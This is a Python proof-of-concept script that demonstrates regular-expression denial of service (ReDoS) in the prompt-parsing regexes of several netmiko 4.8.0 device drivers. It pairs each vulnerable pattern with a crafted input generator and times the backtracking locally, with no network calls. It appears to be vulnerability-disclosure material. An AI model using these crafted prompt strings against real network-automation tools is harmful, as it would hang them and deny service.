#!/usr/bin/env python3
"""Non-destructive PoC for the Netmiko device-prompt ReDoS cluster.

Times the EXACT regexes used by netmiko 4.8.0's per-driver set_base_prompt() overrides
against device-controllable prompt strings. Opens no network connections and runs no
device commands — it only demonstrates the catastrophic backtracking.

    python3 poc.py            # growth tables for all four sites

Sites (all via re.search on cur_base_prompt = device output):
    nokia_sros.py:67 / nokia_isam.py:25   r"\\*?(.*?)(>.*)*#"       exponential
    extreme_exos.py:41                     r"[\\*\\s]*(.*)\\.\\d+"     polynomial (~cubic)
    cisco_asa_ssh.py:116                   r"(.*)\\(conf.*"           polynomial (~quadratic)
"""
import re
import signal
import time

CASES = [
    ("nokia (sros/isam)  \\*?(.*?)(>.*)*#", re.compile(r"\*?(.*?)(>.*)*#"),
     lambda n: ">" * n, range(16, 30, 2)),
    ("extreme_exos       [\\*\\s]*(.*)\\.\\d+", re.compile(r"[\*\s]*(.*)\.\d+"),
     lambda n: " " * n + "!", (250, 500, 1000, 2000, 4000)),
    ("cisco_asa          (.*)\\(conf.*", re.compile(r"(.*)\(conf.*"),
     lambda n: "a " * n + "!", (2500, 5000, 10000, 20000, 40000)),
]


class _Timeout(Exception):
    pass


def _guard(seconds):
    signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(_Timeout()))
    signal.setitimer(signal.ITIMER_REAL, seconds)


def timed(rx, s, limit=10.0):
    _guard(limit)
    try:
        t0 = time.perf_counter()
        rx.search(s)
        dt = time.perf_counter() - t0
        signal.setitimer(signal.ITIMER_REAL, 0)
        return dt
    except _Timeout:
        signal.setitimer(signal.ITIMER_REAL, 0)
        return None


def main():
    for label, rx, attack, ns in CASES:
        print(f"\n=== {label} ===")
        for n in ns:
            dt = timed(rx, attack(n))
            if dt is None:
                print(f"  n={n:<6d} >10s  -> denial of service (aborted)")
                break
            print(f"  n={n:<6d} {dt:9.4f}s")


if __name__ == "__main__":
    main()
